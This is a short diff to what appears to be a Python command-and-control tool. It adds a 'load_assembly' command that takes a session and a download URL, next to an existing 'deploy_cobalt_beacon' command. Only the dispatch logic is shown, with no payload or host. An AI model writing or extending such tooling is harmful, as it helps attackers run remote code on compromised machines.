@@ -334,6 +334,13 @@ while True:
                         except IndexError:
                             print(colored("[+] Please select a module !"))
 
+                    elif scommand.split(" ")[0] == "load_assembly":
+                        try:
+                            load_assembly(session[2], scommand)
+                            pass
+                        except IndexError:
+                            print(colored("[+] Invalid download URL !"))
+
                     elif scommand.split(" ")[0] == "deploy_cobalt_beacon":
                         try:
                             beacon_path = scommand.split(" ")[1]
